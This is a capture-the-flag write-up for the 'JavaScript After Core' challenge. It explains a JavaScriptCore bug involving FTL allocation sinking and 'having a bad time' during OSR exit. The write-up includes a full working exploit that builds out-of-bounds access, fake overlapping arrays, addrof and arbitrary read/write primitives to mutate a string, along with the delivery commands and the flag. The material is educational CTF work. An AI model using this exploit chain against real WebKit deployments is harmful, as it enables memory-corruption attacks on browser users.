# JavaScript After Core

**Category:** Pwn | **Difficulty:** Elite | **Points:** 260 | **Flag:** `pwnsec{313f42d9e1959e21}`

## Challenge Description

> We pinned JavaScriptCore to a WebKit revision from just before a certain fix landed, stripped every convenience the `jsc` shell hands a would-be exploiter, and bolted a single door onto it. `win(str, callback)` is that door: it takes the string `hello!!!` and your callback, and calls the callback twice. Between the two calls the string must read `pwned!!!`; after the second it must read `world!!!`. Strings in JavaScript are immutable, so the language says this is impossible. Do it anyway and the server prints the flag. The archive contains the exact patch applied to the shell, the pinned revision, and the Dockerfile that builds it (x86-64).
>
> — @m411k

## TL;DR

The challenge asks us to change one JavaScript string from `hello!!!` to
`pwned!!!` and then to `world!!!`. JavaScript strings are immutable, so normal
JavaScript cannot do that.

The supplied JavaScriptCore build is from immediately before a WebKit fix. The
bug appears when the optimizing compiler temporarily removes an array, the
global object enters an unusual mode called **having a bad time**, and the
compiler later reconstructs that array during an optimization bailout. The
array object is reconstructed as one kind of array, but its backing allocation
still has the layout of another kind.

That layout disagreement lets one array overwrite the length metadata of the
next array. The result is an array with a gigantic backing-store length, giving
an out-of-bounds read/write primitive. I use that primitive to:

1. find a recognizable group of JavaScript objects in memory;
2. turn two of them into overlapping boxed and unboxed arrays;
3. build `addrof`, followed by a small arbitrary read/write primitive; and
4. replace the internal character-data pointer of the original `hello!!!`
   string during each callback.

The final payload worked locally and on the remote instance.

```text
pwnsec{313f42d9e1959e21}
```

---

## What the challenge wants

The custom shell function is roughly equivalent to this:

```js
win(str, callback) {
    require(str === "hello!!!");

    callback(str);
    require(str === "pwned!!!");

    callback(str);
    require(str === "world!!!");

    print_the_flag();
}
```

There is one extra detail that matters: the C++ implementation saves a pointer
to the **same `JSString` object** and asks that object for its current value after
each callback. Supplying three different JavaScript strings does not help. We
must mutate the internals of the original object.

The easy shell helpers normally used in JavaScript-engine CTFs were removed:
there is no `addressOf`, `read`, `write`, `load`, or `$262`. The target also
runs without friendly JIT flags or a built-in address leak. The exploit has to
bootstrap its own memory primitives from the engine bug.

## A small amount of JavaScriptCore background

This section sounds scarier than it is. There are only four ideas needed for
the rest of the writeup.

### 1. Arrays have an object and a backing store

A JSC array is not one continuous C++ object. The small garbage-collected object
contains metadata and a pointer to a separate allocation holding the elements.
WebKit calls that backing allocation a **Butterfly**.

An ordinary contiguous array can be pictured like this:

```text
JSArray object  ----->  [length header][element 0][element 1][element 2]...
```

### 2. Not every array uses the same Butterfly layout

JSC has several array indexing modes. Two relevant ones are:

- **Contiguous/Int32:** a compact header followed immediately by values;
- **ArrayStorage/SlowPut:** extra bookkeeping fields come before its value
  vector.

A simplified comparison is:

```text
Contiguous:    [header][value 0][value 1][value 2]...
ArrayStorage:  [header][sparse map][count/bias][value 0][value 1]...
```

Therefore, if memory was allocated as Contiguous but code accesses it as
ArrayStorage, every element access is shifted by two 64-bit words. It is like
using the wrong blueprint for the same house: the engine thinks the bedroom is
where the kitchen really is.

### 3. The JIT may make an allocation disappear

JavaScriptCore has several execution tiers. Its FTL optimizing compiler can
notice that a temporary array never truly escapes a function. It can then
**sink** the allocation: instead of creating the array immediately, it keeps
the needed values in registers or compiler state.

If an assumption later becomes false, execution performs an **OSR exit** back
to less optimized code. JSC must then **materialize** the previously imaginary
array so ordinary code can continue using it.

### 4. “Having a bad time” is real JSC terminology

Adding an indexed property such as a getter to `Array.prototype` invalidates
many assumptions about fast arrays. Internally, the global object calls
`haveABadTime()` and switches arrays to the conservative
`SlowPutArrayStorage` representation.

That mode change is normally safe. The vulnerable corner case is changing mode
between FTL compilation and the OSR reconstruction of a sunk array.

## The bug

The vulnerable revision creates the reconstructed array with this structure:

```cpp
Structure* structure =
    globalObject->arrayStructureForIndexingTypeDuringAllocation(
        materialization->indexingType());
```

When the code was compiled, the array was an ordinary Int32/Contiguous array.
After `haveABadTime()`, however, the function above returns a
SlowPutArrayStorage structure. Meanwhile, the Butterfly that FTL prepared for
the phantom array still has the old compact layout.

So the reconstructed object says:

> “I am an ArrayStorage array.”

Its backing memory says:

> “I am a compact Contiguous array.”

That mismatch is the vulnerability.

The later upstream fix makes reconstruction start with the **original** array
structure, fills the correctly shaped compact Butterfly, and only then converts
the result if the VM is having a bad time. It also adds correct handling for
holes in ArrayStorage during population.

## Triggering it

The core trigger uses two arrays of length six:

```js
let trigger = false;
let OOB = null;

function changePrototype() {
    if (trigger) {
        Object.defineProperty(Array.prototype, 100, {
            get() { return 42; }, configurable: true
        });
        Object.defineProperty(Array.prototype, "foo", {
            get() {
                if (this.length !== 6)
                    OOB = this;
                return 0;
            },
            configurable: true
        });
    }
}
noInline(changePrototype);

function checkpoint() { return effectful42(); }
noInline(checkpoint);

function vuln() {
    let a = new Array(6);
    a[2] = 12; a[3] = 13; a[4] = 14; a[5] = 15;

    let b = new Array(6);
    b[2] = 22; b[3] = 23; b[4] = 24; b[5] = 25;

    changePrototype();
    checkpoint();

    return a[2] + a[3] + a[4] + a[5]
         + b[2] + b[3] + b[4] + b[5]
         + (a.foo || 0) + (b.foo || 0);
}
noInline(vuln);
```

We first call `vuln()` many times with `trigger === false`. This teaches FTL
that the arrays are normal and non-escaping, allowing it to sink them. Then we
set `trigger = true`. During the optimized call, the indexed prototype getter
makes the VM have a bad time and invalidates the optimized assumptions. The OSR
exit reconstructs both phantom arrays using mismatched layouts.

### Why leave indices 0 and 1 empty?

ArrayStorage's actual value vector starts two words later than the compact
layout's vector. Leaving two holes at the front makes the malformed structure
survive long enough to be useful. Our values at indices 2 through 5 are then
written using the shifted ArrayStorage interpretation.

The two length-six Butterfly allocations are 64 bytes each and land next to one
another. The shifted write of the last value from one Butterfly crosses into
the neighboring Butterfly's `IndexingHeader`.

The integer `15` is represented as the boxed JSC value:

```text
0xfffe00000000000f
```

Interpreted as the neighboring header, that gives it a vector length of
`0xfffe0000`. We have turned a six-element array into an array that believes it
can access almost the entire surrounding address range.

### Getting the corrupted array back into JavaScript

This part was surprisingly important. Simply writing this inside `vuln()` does
not work:

```js
OOB = a;
```

That makes the array visibly escape during compilation, so FTL refuses to sink
it. No sunk array means no buggy rematerialization.

The workaround is the named `Array.prototype.foo` getter shown above. During
warmup, `a.foo` and `b.foo` look harmless and do not stop allocation sinking.
Only during the trigger do we install the getter. After the bailout, baseline
code performs the property lookup and invokes the getter with the materialized
array as `this`. The getter saves whichever array now has a corrupted length.

This gives the first real primitive:

```text
OOB[index] = read or write far beyond OOB's genuine allocation
```

## Turning OOB access into useful primitives

Randomly reading a large chunk of the heap is not yet a clean exploit. We still
need a recognizable location and a way to convert JavaScript object references
into raw addresses.

### Spraying recognizable Marker objects

I allocate a short linked list of objects with distinctive values:

```js
function Marker(next, id) {
    this.m1 = 13.371337;
    this.m2 = 14.481448;
    this.id = id;
    this.next = next;
}

let head = null;
for (let i = 0; i < 10; ++i)
    head = new Marker(head, i);
```

They are small, uniform 48-byte cells. The link keeps all of them alive, and the
two unusual doubles plus an ID form an easy signature. The corrupted array scans
forward until it finds:

```js
OOB[i]     === 13.371337
OOB[i + 1] === 14.481448
OOB[i + 2] === 0
```

This is heap grooming rather than an address leak. We do not yet know the
absolute address, but we now know where a predictable run of live objects sits
relative to the OOB array.

### Forging two overlapping arrays

Each Marker begins with a JSCell header and a Butterfly pointer. Through the OOB
array, I replace those fields on two Markers with headers calibrated for this
exact JSC build:

```js
const HDR_DOUBLE = 0x01082907010024e0n;
const HDR_CONTIG = 0x0108290901002470n;
```

These constants are type metadata, not heap addresses, so ASLR does not change
them. They were determined locally using a research build with temporary debug
helpers. The final payload uses none of those helpers.

Both fake arrays are pointed at a third Marker used as their shared Butterfly.
One fake array treats every slot as an unboxed IEEE-754 double; the other treats
the same slots as normal boxed JavaScript values.

```text
                  same 64-bit memory
                         |
fake Double array  ------+------  fake Contiguous array
    sees raw bits                    sees JSValues/objects
```

Now an object stored through the boxed view can be read as raw bits through the
double view:

```js
function addrof(x) {
    boxed[2] = x;
    return f2i(raw[2]);
}
```

`f2i` and `i2f` are ordinary `DataView` conversions between a JavaScript double
and its 64-bit bit pattern. They do not read arbitrary memory by themselves;
the overlapping array types are what make them powerful.

One small implementation nuisance is JSC's NaN-boxed representation. Values
written through the original generic OOB array need compensation for its boxed
number offset:

```js
const OFF = 0x0002000000000000n;
```

That is why the early header writes use `header - OFF`. Once writes go through
the fake Double array, they are raw 64-bit writes and no adjustment is needed.

### Building a steerable read/write array

A fourth Marker becomes another fake Double array. Its Butterfly pointer is
under the control of the overlapping raw view. Pointing that Butterfly at
`address + 8` makes element zero access the second 64-bit word of the target
cell:

```js
function readCellQ1(addr) {
    raw[19] = i2f(addr + 8n); // replace fake array's Butterfly
    return arb[0];
}

function writeCellQ1(addr, value) {
    raw[19] = i2f(addr + 8n);
    arb[0] = value;
}
```

The word immediately before the forged Butterfly is interpreted as an array
length header. A `JSString` cell's real header happens to satisfy the bounds
checks needed for this one-element access. Therefore this focused primitive is
enough; a general-purpose shellcode chain is unnecessary.

## Changing an immutable string

I create three fresh, flat, eight-character strings:

```js
let s  = String.fromCharCode(104,101,108,108,111,33,33,33); // hello!!!
let ps = String.fromCharCode(112,119,110,101,100,33,33,33); // pwned!!!
let ws = String.fromCharCode(119,111,114,108,100,33,33,33); // world!!!
```

All three have the same representation and length. A JSC `JSString` cell stores
its character-data/fiber reference in its second 64-bit word. With `addrof`, I
obtain the three cell addresses, then read the data words from `ps` and `ws`:

```js
let sa = addrof(s);
let pa = addrof(ps);
let wa = addrof(ws);

let pf = readCellQ1(pa);
let wf = readCellQ1(wa);
```

The callback swaps those already valid internal references into the original
`s` object:

```js
let stage = 0;
win(s, function () {
    writeCellQ1(sa, stage++ === 0 ? pf : wf);
});
```

After callback one, the same object resolves to `pwned!!!`. After callback two,
it resolves to `world!!!`. The C++ checks pass and `win()` launches the flag
reader.

## Reliability

The remote uses the default concurrent JIT, so simply running a fixed small
number of warmup calls was unreliable. The final schedule is:

```js
for (let i = 0; i < 20000; ++i)
    vuln();

let waitUntil = preciseTime() + 0.2;
while (preciseTime() < waitUntil) {}

for (let i = 0; i < 2000; ++i)
    vuln();

fullGC();
trigger = true;
vuln();
```

The first loop makes the function hot, the short wait gives concurrent FTL
compilation time to finish, and the second loop makes sure optimized code is
being used. `fullGC()` immediately before triggering lowers the chance of GC
pressure during exploitation.

No garbage collection is allowed after corruption. The malformed array can
confuse the collector, and the fake objects rely on the groomed layout staying
put.

This setup succeeded 20/20 times when directly testing fresh local JSC
processes, 5/5 times through the exact local TCP service, and on the first
remote connection.

## Final exploit

```js
let cvtBuf = new ArrayBuffer(8);
let cvt = new DataView(cvtBuf);
function f2i(x) { cvt.setFloat64(0, x, true); return cvt.getBigUint64(0, true); }
function i2f(x) { cvt.setBigUint64(0, x, true); return cvt.getFloat64(0, true); }
const OFF = 0x0002000000000000n;
const HDR_DOUBLE = 0x01082907010024e0n;
const HDR_CONTIG = 0x0108290901002470n;

let trigger = false;
let OOB = null;
function changePrototype() {
    if (trigger) {
        Object.defineProperty(Array.prototype, 100, { get() { return 42; }, configurable: true });
        Object.defineProperty(Array.prototype, "foo", {
            get() { if (this.length !== 6) OOB = this; return 0; }, configurable: true
        });
    }
}
noInline(changePrototype);
function checkpoint() { return effectful42(); }
noInline(checkpoint);
function vuln() {
    let a = new Array(6); a[2]=12; a[3]=13; a[4]=14; a[5]=15;
    let b = new Array(6); b[2]=22; b[3]=23; b[4]=24; b[5]=25;
    changePrototype();
    checkpoint();
    return a[2]+a[3]+a[4]+a[5]+b[2]+b[3]+b[4]+b[5]+(a.foo||0)+(b.foo||0);
}
noInline(vuln);
for (let i=0; i<20000; ++i) vuln();
let waitUntil=preciseTime()+0.2;
while(preciseTime()<waitUntil){}
for(let i=0;i<2000;i++)vuln();
fullGC();
trigger = true;
vuln();
delete Array.prototype[100];
delete Array.prototype.foo;
if (OOB === null) throw new Error("no OOB");

function Marker(next, id) {
    this.m1 = 13.371337;
    this.m2 = 14.481448;
    this.id = id;
    this.next = next;
}
noInline(Marker);
let head=null, m0=null, m1=null, m2=null, m3=null, m4=null, m5=null;
for (let i=0; i<10; ++i) {
    head = new Marker(head, i);
    if (i===0) m0=head;
    else if (i===1) m1=head;
    else if (i===2) m2=head;
    else if (i===3) m3=head;
    else if (i===4) m4=head;
    else if (i===5) m5=head;
}
let base=-1;
for (let i=0; i<200000; ++i) {
    if (OOB[i] === 13.371337 && OOB[i+1] === 14.481448 && OOB[i+2] === 0) {
        base=i;
        break;
    }
}
if (base < 0) throw new Error("markers not found");

const FAKE_INDEXING_HEADER = 0x00030000ffffffffn;
OOB[base+9] = i2f(FAKE_INDEXING_HEADER - OFF);
OOB[base+16] = i2f(HDR_DOUBLE - OFF);
OOB[base+17] = m2;
OOB[base+22] = i2f(HDR_CONTIG - OFF);
OOB[base+23] = m2;
let raw = m3;
let boxed = m4;
function addrof(x) { boxed[2] = x; return f2i(raw[2]); }

let s  = String.fromCharCode(104,101,108,108,111,33,33,33);
let ps = String.fromCharCode(112,119,110,101,100,33,33,33);
let ws = String.fromCharCode(119,111,114,108,100,33,33,33);
let sa = addrof(s), pa = addrof(ps), wa = addrof(ws);
raw[18] = i2f(HDR_DOUBLE);
let arb = m5;
function readCellQ1(addr) { raw[19] = i2f(addr + 8n); return arb[0]; }
function writeCellQ1(addr, value) { raw[19] = i2f(addr + 8n); arb[0] = value; }
let pf = readCellQ1(pa);
let wf = readCellQ1(wa);
let stage = 0;
win(s, function() {
    writeCellQ1(sa, stage++ === 0 ? pf : wf);
});
```

## Running it

Against the local Docker service:

```bash
nc -N localhost 1337 < exploit.js
```

Local result:

```text
pwnsec{fake_flag_for_local_testing}
```

The hosted service used TLS, so I sent the same file with:

```bash
openssl s_client -quiet \
  -connect CHALLENGE_HOST:443 \
  -servername CHALLENGE_HOST \
  < exploit.js
```

Remote result:

```text
pwnsec{313f42d9e1959e21}
```

## Dead ends worth mentioning

- **Saving the corrupted array directly:** this made the array escape and
  prevented FTL allocation sinking. The named prototype getter was the key.
- **Keeping a fast array by setting its prototype to `null`:** `haveABadTime()`
  converts indexed objects belonging to the affected global anyway.
- **Creating a new fast array after bad time:** even literals and COW arrays
  were allocated in SlowPut mode.
- **Recovering stale values after GC:** the allocator cleared the useful tail
  words, so that route did not produce a pointer primitive.
- **Smuggling pointer bits through doubles:** JSC canonicalized or purified the
  relevant NaN values. Overlapping Double and boxed arrays was the dependable
  route.
- **Running GC after obtaining OOB:** this destabilized the fake layout, so the
  final exploit performs its last collection before triggering corruption.

## Takeaway

The fun part of this challenge is that the initial bug is not an obvious
“write anywhere” mistake. It is a disagreement between the optimizer's old
mental model and the runtime's new array mode during a rare bailout path.

From there, the exploit is a chain of increasingly useful lies:

```text
wrong array layout
    -> corrupted array length
    -> out-of-bounds heap access
    -> fake overlapping arrays
    -> object addresses and targeted memory writes
    -> mutable "immutable" string
    -> flag
```

JavaScript itself still treats strings as immutable. We simply went underneath
JavaScript and changed what its engine thought the string pointed to.
